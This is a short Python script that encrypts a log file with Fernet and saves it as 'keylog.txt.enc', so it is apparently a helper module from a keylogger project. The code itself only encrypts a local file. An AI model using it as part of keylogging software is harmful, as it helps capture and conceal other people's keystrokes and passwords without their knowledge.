from cryptography.fernet import Fernet
from config import LOG_FILE, load_key

def encrypt_log():
    key = load_key()
    cipher = Fernet(key)

    with open(LOG_FILE, "rb") as f:
        data = f.read()

    encrypted = cipher.encrypt(data)

    with open(LOG_FILE + ".enc", "wb") as f:
        f.write(encrypted)

    print("Encrypted log saved as keylog.txt.enc")

if __name__ == "__main__":
    encrypt_log()
